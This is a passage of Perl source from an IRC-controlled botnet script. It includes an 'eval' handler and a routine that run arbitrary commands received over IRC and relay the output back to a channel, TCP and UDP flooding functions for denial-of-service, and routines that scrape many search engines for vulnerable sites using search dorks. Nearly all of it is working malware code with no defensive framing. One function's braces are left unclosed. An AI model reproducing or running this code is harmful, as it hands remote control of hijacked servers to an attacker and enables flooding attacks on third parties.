   if ($case =~ /^eval (.*)/) { 

      eval "$1"; 

   } 

} 

  

sub get_html() { 

$test=$_[0]; 

  

      $ip=$_[1]; 

      $port=$_[2]; 

  

my $req=HTTP::Request->new(GET=>$test); 

my $ua=LWP::UserAgent->new(); 

if(defined($ip) && defined($port)) { 

      $ua->proxy("http","http://$ip:$port/"); 

      $ua->agent("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"); 

} 

$ua->timeout(1); 

my $response=$ua->request($req); 

if ($response->is_success) { 

   $re=$response->content; 

} 

return $re; 

} 

  

sub addproc { 

  

   my $proc=$_[0]; 

   my $dork=$_[1]; 

     

   open(FILE,">>/var/tmp/pids"); 

   print FILE $proc." [".$irc_servers{$IRC_cur_socket}{'nick'}."] $dork\n"; 

   close(FILE); 

} 

  

  

sub delproc { 

  

   my $proc=$_[0]; 

   open(FILE,"/var/tmp/pids"); 

  

   while(<FILE>) { 

      $_ =~ /(\d+)\s+(.*)/; 

      $childs{$1}=$2; 

   } 

   close(FILE); 

   delete($childs{$proc}); 

  

   open(FILE,">/var/tmp/pids"); 

  

   for $klucz (keys %childs) { 

      print FILE $klucz." ".$childs{$klucz}."\n"; 

   } 

} 

  

sub zr { 

   my $printl=$_[0]; 

   my $comando=$_[1]; 

   if ($comando =~ /cd (.*)/) { 

      chdir("$1") || msg("$printl", "No such file or directory"); 

      return; 

   } elsif ($pid = fork) { 

      waitpid($pid, 0); 

   } else { 

      if (fork) { 

         exit; 

      } else { 

         my @resp=`$comando 2>&1 3>&1`; 

         my $c=0; 

         foreach my $linha (@resp) { 

            $c++; 

            chop $linha; 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha"); 

            if ($c == "$linas_max") { 

               $c=0; 

               sleep $sleep; 

            } 

         } 

         exit; 

      } 

   } 

} 

  

sub tcpflooder { 

   my $itime = time; 

   my ($cur_time); 

   my ($ia,$pa,$proto,$j,$l,$t); 

   $ia=inet_aton($_[0]); 

   $pa=sockaddr_in($_[1],$ia); 

   $ftime=$_[2]; 

   $proto=getprotobyname('tcp'); 

   $j=0;$l=0; 

   $cur_time = time - $itime; 

   while ($l<1000){ 

      $cur_time = time - $itime; 

      last if $cur_time >= $ftime; 

      $t="SOCK$l"; 

      socket($t,PF_INET,SOCK_STREAM,$proto); 

      connect($t,$pa)||$j--; 

      $j++; 

      $l++; 

   } 

   $l=0; 

   while ($l<1000){ 

      $cur_time = time - $itime; 

      last if $cur_time >= $ftime; 

      $t="SOCK$l"; 

      shutdown($t,2); 

      $l++; 

   } 

} 

  

sub udpflooder { 

   my $iaddr = inet_aton($_[0]); 

   my $msg = 'A' x $_[1]; 

   my $ftime = $_[2]; 

   my $cp = 0; 

   my (%pacotes); 

   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0; 

   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++; 

   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++; 

   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++; 

   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++; 

   return(undef) if $cp == 4; 

   my $itime = time; 

   my ($cur_time); 

   while ( 1 ) { 

      for (my $porta = 1; $porta <= 65000; $porta++) { 

         $cur_time = time - $itime; 

         last if $cur_time >= $ftime; 

         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++; 

         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++; 

         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++; 

         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++; 

         for (my $pc = 3; $pc <= 255;$pc++) { 

            next if $pc == 6; 

            $cur_time = time - $itime; 

            last if $cur_time >= $ftime; 

            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next; 

            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++; 

         } 

      } 

      last if $cur_time >= $ftime; 

   } 

   return($cur_time, %pacotes); 

} 

  

sub ctcp { 

   return unless $#_ == 1; 

   sendraw("PRIVMSG $_[0] :\001$_[1]\001"); 

} 

  

sub msg { 

   return unless $#_ == 1; 

   sendraw("PRIVMSG $_[0] :$_[1]"); 

} 

  

sub notice { 

   return unless $#_ == 1; 

   sendraw("NOTICE $_[0] :$_[1]"); 

} 

  

sub op { 

   return unless $#_ == 1; 

   sendraw("MODE $_[0] +o $_[1]"); 

} 

  

sub deop { 

   return unless $#_ == 1; 

   sendraw("MODE $_[0] -o $_[1]"); 

} 

  

sub j { 

   &join(@_); 

} 

  

sub join { 

   return unless $#_ == 0; 

   sendraw("JOIN $_[0]"); 

} 

  

sub p { 

   part(@_); 

} 

  

sub part { 

   sendraw("PART $_[0]"); 

} 

  

sub nick { 

   return unless $#_ == 0; 

   sendraw("NICK $_[0]"); 

} 

  

sub quit { 

   sendraw("QUIT :$_[0]"); 

} 

  

sub fetch(){ 

   my $rnd=(int(rand(9999))); 

   my $n= 80; 

   if ($rnd<5000) { 

      $n<<=1; 

   } 

   my $s= (int(rand(10)) * $n); 

   my @dominios = ("removed-them-all"); 

   my @str; 

   foreach $dom  (@dominios){ 

      push (@str,"@gstring"); 

   } 

   my $query="www.google.com/search?q="; 

   $query.=$str[(rand(scalar(@str)))]; 

   $query.="&num=$n&start=$s"; 

   my @lst=(); 

   sendraw("privmsg #debug :DEBUG only test googling: ".$query.""); 

   my $page = http_query($query); 

   while ($page =~  m/<a href=\"?http:\/\/([^>\"]+)\"? class=l>/g){ 

      if ($1 !~ m/google|cache|translate/){ 

         push (@lst,$1); 

      } 

   } 

   return (@lst); 

  

sub yahoo(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=100){ 

my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b); 

my $Res=query($Ya); 

while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){ 

my $k=$1; 

$k=~s/<b>//g; 

$k=~s/<\/b>//g; 

$k=~s/<wbr>//g; 

my @grep=links($k); 

push(@lst,@grep); 

}} 

return @lst; 

} 

  

sub msn(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=10){ 

my $msn=("http://search.msn.de/results.aspx?q=".key($key)."&first=".$b."&FORM=PORE"); 

my $Res=query($msn); 

while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 

if($1 !~ /msn|live/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

sub lycos(){ 

my $inizio=0; 

my $pagine=20; 

my $key=$_[0]; 

my $av=0; 

my @lst; 

while($inizio <= $pagine){ 

my $lycos="http://search.lycos.com/?query=".key($key)."&page=$av"; 

my $Res=query($lycos); 

while ($Res=~ m/<span class=\"?grnLnk small\"?>http:\/\/(.+?)\//g ){ 

my $k="$1"; 

my @grep=links($k); 

push(@lst,@grep); 

} 

$inizio++; 

$av++; 

} 

return @lst; 

} 

  

##### 

sub aol(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=100;$b++){ 

my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8"); 

my $Res=query($AoL); 

while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}} 

return @lst; 

} 

##### 

  

##### 

sub alltheweb() 

{ 

my @lst; 

my $key=$_[0]; 

my $i=0; 

my $pg=0; 

for($i=0; $i<=1000; $i+=100) 

{ 

my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i); 

my $Res=query($all); 

while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){ 

my $k=$1; 

$k=~s/ //g; 

my @grep=links($k); 

push(@lst,@grep); 

}} 

return @lst; 

} 

  

sub google(){ 

my @lst; 

my $key = $_[0]; 

for($b=0;$b<=100;$b+=100){ 

my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b); 

my $Res=query($Go); 

while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 

if ($1 !~ /google/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

##### 

# SUBS SEARCH 

##### 

sub search(){ 

my @lst; 

my $key = $_[0]; 

for($b=0;$b<=1000;$b+=100){ 

my $ser=("http://www.search.com/search?q=".key($key)."".$b); 

my $Res=query($ser); 

while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 

if ($1 !~ /msn|live|google|yahoo/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

##### 

# SUBS FireBall 

##### 

sub fireball(){ 

my $key=$_[0]; 

my $inicio=1; 

my $pagina=200; 

my @lst; 

my $av=0; 

while($inicio <= $pagina){ 

my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8"; 

my $Res=query($fireball); 

while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){ 

if ($1 !~ /msn|live|google|yahoo/){ 

my $k="$1/"; 

my @grep=links($k); 

push(@lst,@grep); 

}} 

$av=$av+10; 

$inicio++; 

} 

return @lst; 

} 

##### 

# SUBS UOL 

##### 

sub uol(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=10){ 

my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i); 

my $Res=query($UoL); 

while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){ 

my $k=$1; 

if($k!~/busca|uol|yahoo/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

##### 

# Altavista 

##### 

sub altavista(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=10){ 

my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b); 

my $Res=query($AlT); 

while($Res=~m/<span class=ngrn>(.+?)\//g){ 

if($1 !~ /altavista/){ 

my $k=$1; 

$k=~s/<//g; 

$k=~s/ //g; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

sub altavistade(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=10){ 

my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b); 

my $Res=query($AlT); 

while($Res=~m/<span class=ngrn>(.+?)\//g){ 

if($1 !~ /altavista/){ 

my $k=$1; 

$k=~s/<//g; 

$k=~s/ //g; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

sub altavistaus(){ 

my @lst; 

my $key = $_[0]; 

for($b=1;$b<=1000;$b+=10){ 

my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b); 

my $Res=query($AlT); 

while($Res=~m/<span class=ngrn>(.+?)\//g){ 

if($1 !~ /altavista/){ 

my $k=$1; 

$k=~s/<//g; 

$k=~s/ //g; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

##### 

# HotBot 

##### 

sub hotbot(){ 

my @lst; 

my $key = $_[0]; 

for($b=0;$b<=1000;$b+=100){ 

my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b); 

my $Res=query($hot); 

while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 

if ($1 !~ /msn|live|google|yahoo/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

  

##### 

# Mamma 

##### 

sub mamma(){ 

my @lst; 

my $key = $_[0]; 

for($b=0;$b<=1000;$b+=100){ 

my $mam=("http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=".key($key)."".$b); 

my $Res=query($mam); 

while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){ 

if ($1 !~ /msn|live|google|yahoo/){ 

my $k=$1; 

my @grep=links($k); 

push(@lst,@grep); 

}}} 

return @lst; 

} 

  

##### 

# MozBot 

##### 

sub mozbot() 

{ 

my @lst; 

my $key=$_[0]; 

my $i=0; 

my $pg=0; 

for($i=0; $i<=100; $i+=1){ 

my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i); 

my $Res=query($mozbot); 

while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){ 

my $k=$1; 

$k=~s/ //g; 

my @grep=links($k); 

push(@lst,@grep); 

}} 

return @lst; 

} 

  

sub links() 

{ 

my @l; 

my $link=$_[0]; 

my $host=$_[0]; 

my $hdir=$_[0]; 

$hdir=~s/(.*)\/[^\/]*$/\1/; 

$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 

$host.="/"; 

$link.="/"; 

$hdir.="/"; 

$host=~s/\/\//\//g; 

$hdir=~s/\/\//\//g; 

$link=~s/\/\//\//g; 

push(@l,$link,$host,$hdir); 

return @l; 

} 

  

sub geths(){ 

my $host=$_[0]; 

$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 

return $host; 

} 

  

sub key(){ 

my $chiave=$_[0]; 

$chiave =~ s/ /\+/g; 

$chiave =~ s/:/\%3A/g; 

$chiave =~ s/\//\%2F/g; 

$chiave =~ s/&/\%26/g; 

$chiave =~ s/\"/\%22/g; 

$chiave =~ s/,/\%2C/g; 

$chiave =~ s/\\/\%5C/g; 

return $chiave; 

} 

  

sub query($){ 

my $url=$_[0]; 

$url=~s/http:\/\///; 

my $host=$url; 

my $query=$url; 

my $page=""; 

$host=~s/href=\"?http:\/\///; 

$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/; 

$query=~s/$host//; 

if ($query eq "") {$query="/";}; 

eval { 

my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return; 

print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 

my @r = <$sock>; 

$page="@r"; 

close($sock); 

}; 

return $page; 

} 

  

sub unici{ 

my @unici = (); 

my %visti = (); 

foreach my $elemento ( @_ ) 

{ 

next if $visti{ $elemento }++; 

push @unici, $elemento; 

}    

return @unici; 

} 

  

sub http_query($){ 

my ($url) = @_; 

my $host=$url; 

my $query=$url; 

my $page=""; 

$host =~ s/href=\"?http:\/\///; 

$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/; 

$query =~s/$host//; 

if ($query eq "") {$query="/";}; 

eval { 

local $SIG{ALRM} = sub { die "1";}; 

alarm 10; 

my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return; 

print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 

my @r = <$sock>; 

$page="@r"; 

alarm 0; 

close($sock); 

}; 

return $page; 

}}
